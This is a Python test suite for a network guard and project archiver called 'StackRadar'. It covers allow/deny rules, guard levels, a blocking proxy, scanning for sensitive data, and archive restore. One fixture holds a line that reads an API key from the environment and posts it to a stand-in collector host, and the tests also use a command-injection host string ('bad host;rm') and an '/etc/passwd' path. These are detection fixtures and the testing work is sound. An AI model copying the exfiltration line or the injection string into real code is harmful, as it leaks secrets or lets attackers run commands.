"""Network Guard + archive tests. Run:  python3 -m unittest discover -s tests -v"""
import os
import socket
import sys
import tempfile
import threading
import time
import unittest
import urllib.request

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import stackradar as sr  # noqa: E402


class GuardPolicyTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        sr.NET_RULES_FILE = os.path.join(self.tmp, "rules.json")
        sr.NET["rules"] = None
        sr.NET["temp"].clear()
        self._level("medium")

    def _level(self, lv):
        d = sr.settings_defaults()
        d["net_level"] = lv
        sr.SETTINGS["data"] = d

    def test_host_info(self):
        self.assertEqual(sr.host_info("api.openai.com")["category"], "ai")
        self.assertEqual(sr.host_info("eu.i.posthog.com")["category"], "telemetry")
        self.assertEqual(sr.host_info("127.0.0.1")["category"], "local")
        self.assertEqual(sr.host_info("192.168.1.4")["category"], "lan")
        self.assertEqual(sr.host_info("weird-host.xyz")["category"], "unknown")

    def test_rule_precedence(self):
        sr.rule_add("*", "*.example.org", "deny")
        sr.rule_add("/p/app", "api.example.org", "allow")
        self.assertEqual(sr.rule_lookup("/p/app", "api.example.org")["action"], "allow")
        self.assertEqual(sr.rule_lookup("/p/other", "api.example.org")["action"], "deny")
        self.assertIsNone(sr.rule_lookup("/p/app", "example.com"))
        with self.assertRaises(ValueError):
            sr.rule_add("*", "bad host;rm", "deny")

    def test_levels(self):
        app = {"name": "a", "path": None}
        self._level("low")
        self.assertTrue(sr.guard_decide(app, "anything.xyz", 443, "https")[0])
        self._level("medium")
        self.assertTrue(sr.guard_decide(app, "registry.npmjs.org", 443, "https")[0])
        self._level("strict")
        allow, why = sr.guard_decide(app, "anything.xyz", 80, "http", [{"type": "email address"}])
        self.assertFalse(allow)
        self.assertIn("sensitive", why)
        sr.rule_add("*", "anything.xyz", "deny")
        self.assertFalse(sr.guard_decide(app, "anything.xyz", 443, "https")[0])

    def test_prompt_answer(self):
        self._level("strict")
        app = {"name": "a", "path": "/p/a"}
        res = {}
        t = threading.Thread(target=lambda: res.update(r=sr.guard_decide(app, "new-host.xyz", 443, "https")))
        t.start()
        for _ in range(50):
            pend = sr.pending_view()
            if pend:
                break
            time.sleep(0.05)
        self.assertEqual(pend[0]["host"], "new-host.xyz")
        self.assertTrue(sr.guard_answer(pend[0]["id"], "allow_always")["ok"])
        t.join(3)
        self.assertTrue(res["r"][0])
        self.assertEqual(sr.rule_lookup("/p/a", "new-host.xyz")["action"], "allow")

    def test_sensitive_scan(self):
        found = {f["type"] for f in sr.scan_sensitive("POST /x HTTP/1.1\r\nAuthorization: Bearer abc\r\n\r\n{\"email\":\"a@b.co\"}")}
        self.assertIn("Authorization header", found)
        self.assertIn("email address", found)

    def test_net_refs(self):
        with tempfile.TemporaryDirectory() as d:
            fp = os.path.join(d, "app.py")
            with open(fp, "w") as f:
                f.write("import os\nKEY = os.environ['API_KEY']\nrequests.post('http://collector.weird.xyz/up', headers={'x': KEY})\n"
                        "TRACK = 'https://api.segment.io/v1/track'\n")
            refs = {r["host"]: r for r in sr.extract_net_refs(d, [fp], [{"name": "stripe", "from": "package.json"}])}
            self.assertEqual(refs["collector.weird.xyz"]["risk"], "high")
            self.assertEqual(refs["collector.weird.xyz"]["line"], 3)
            self.assertIn("analytics / tracking", refs["api.segment.io"]["notes"])
            self.assertEqual(refs["api.stripe.com"]["via"], "sdk dependency")


class GuardProxyTests(unittest.TestCase):
    def test_proxy_blocks_denied_host(self):
        tmp = tempfile.mkdtemp()
        sr.NET_RULES_FILE = os.path.join(tmp, "rules.json")
        sr.NET["rules"] = None
        d = sr.settings_defaults()
        d["net_level"] = "medium"
        sr.SETTINGS["data"] = d
        sr.rule_add("*", "blocked.test", "deny")
        port = sr.guard_proxy_start()
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": "http://127.0.0.1:%d" % port}))
        with self.assertRaises(urllib.error.HTTPError) as cm:
            opener.open("http://blocked.test/secret", timeout=10)
        self.assertEqual(cm.exception.code, 403)
        self.assertIn(b"Blocked by StackRadar", cm.exception.read())


class ArchiveTests(unittest.TestCase):
    def test_archive_and_restore(self):
        home = tempfile.mkdtemp()
        proj = os.path.join(home, "work", "demo-app")
        os.makedirs(os.path.join(proj, "node_modules", "x"))
        with open(os.path.join(proj, "main.py"), "w") as f:
            f.write("print('hi')\n" * 500)
        with open(os.path.join(proj, "node_modules", "x", "big.js"), "w") as f:
            f.write("x" * 50000)
        sr.ARCHIVE_DIR = os.path.join(home, "archives")
        sr.META["data"] = {}
        sr.META_FILE = os.path.join(home, "projects.json")
        old_home, old_up = os.environ.get("HOME"), os.environ.get("USERPROFILE")
        os.environ["HOME"] = home
        os.environ["USERPROFILE"] = home     # expanduser("~") on Windows
        try:
            j = sr.archive_project(proj, trash_original=False, exclude_regen=True)
            self.assertTrue(j["ok"])
            job = self._wait(j["id"])
            self.assertEqual(job["status"], "done", job["logs"])
            info = job["result"]
            self.assertEqual(info["files"], 1)          # node_modules left out
            self.assertTrue(os.path.isfile(info["file"]))
            self.assertEqual(sr.meta_get(proj)["status"], "archived")
            import shutil
            shutil.rmtree(proj)
            r = sr.restore_archive(info["file"])
            job = self._wait(r["id"])
            self.assertEqual(job["status"], "done", job["logs"])
            self.assertTrue(os.path.isfile(os.path.join(proj, "main.py")))
            self.assertFalse(sr.restore_archive("/etc/passwd")["ok"])
        finally:
            for k, v in (("HOME", old_home), ("USERPROFILE", old_up)):
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v

    @staticmethod
    def _wait(jid):
        for _ in range(200):
            j = sr.jobs_view(jid)
            if j and j["status"] != "running":
                return j
            time.sleep(0.05)
        return sr.jobs_view(jid)


if __name__ == "__main__":
    unittest.main()
